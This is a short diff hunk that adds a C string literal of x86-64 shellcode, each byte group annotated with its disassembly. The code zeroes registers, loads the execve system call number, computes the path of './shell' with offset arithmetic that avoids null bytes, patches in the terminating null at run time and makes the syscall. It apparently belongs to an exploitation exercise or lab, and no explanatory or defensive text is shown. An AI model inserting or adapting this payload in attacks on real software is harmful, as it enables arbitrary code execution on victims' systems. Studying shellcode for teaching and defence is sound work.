@@ -1,0 +1,11 @@
+
+    "\x48\x31\xc0"                  // xor    %rax,%rax
+    "\xb0\x3b"                      // mov    $0x3b,%al             # execve system call number
+    "\x48\x8d\x3d\x14\x02\x03\x04"  // lea    0x4030214(%rip),%rdi
+    "\x48\x81\xef\x01\x02\x03\x04"  // sub    $0x4030201,%rdi       # path of executable
+    "\x48\x31\xf6"                  // xor    %rsi,%rsi             # argv
+    "\x48\x31\xd2"                  // xor    %rdx,%rdx             # argp
+    "\x80\x6f\x07\x01"              // subb   $0x1,0x7(%rdi)        # make executable path null-terminated
+    "\x0f\x05"                      // syscall 
+    "./shell\x01";
+
